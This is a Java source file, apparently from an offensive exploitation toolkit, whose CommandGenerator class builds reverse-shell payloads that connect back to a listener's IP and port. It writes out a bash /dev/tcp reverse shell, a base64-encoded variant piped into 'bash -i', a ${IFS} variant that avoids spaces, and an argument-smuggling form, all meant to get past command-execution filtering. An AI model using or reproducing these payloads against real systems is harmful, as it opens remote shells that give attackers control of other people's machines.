package payloads;


import java.util.Base64;

public class CommandGenerator {

    public Listener shellListener;

    public final static String DEFAULT_COMMAND_TEMPLATE = "bash -i >& /dev/tcp/%s/%d 0>&1";

    public String reverseShellCommand;


    public CommandGenerator(Listener listener){
        shellListener = listener;
        reverseShellCommand = String.format(
                DEFAULT_COMMAND_TEMPLATE,
                shellListener.getIp(),
                shellListener.getPort());
    }

    public CommandGenerator(Listener listener, String commandTemplate){
        shellListener = listener;
        reverseShellCommand = String.format(
                commandTemplate,
                shellListener.getIp(),
                shellListener.getPort()
        );
    }

    public void setReverseShellCommand(String cmd){
        this.reverseShellCommand = cmd;
    }

    public String[] getArrayCommandTpl(){
        return new String[]{"/bin/bash","-c",reverseShellCommand};
    }

    /*
     *  It can make pipes and redirects great again through calls to Bash
     *  <p> and it also ensures that there aren't spaces within arguments.
     *
     *  Refercence: http://www.jackson-t.ca/runtime-exec-payloads.html
     */
    public String getBase64CommandTpl(){
        return "bash -c {echo," +
                Base64.getEncoder().encodeToString(reverseShellCommand.getBytes()) +
                "}|{base64,-d}|{bash,-i}";
    }

    public String getIFSCommandTpl(){
        return String.format(
                "bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%d<&1",
                shellListener.getIp(),
                shellListener.getPort()
        );
    }

    public String getArgsCommandTpl(){
        return "bash -c $@|bash 0 echo " +
                reverseShellCommand ;
    }

}
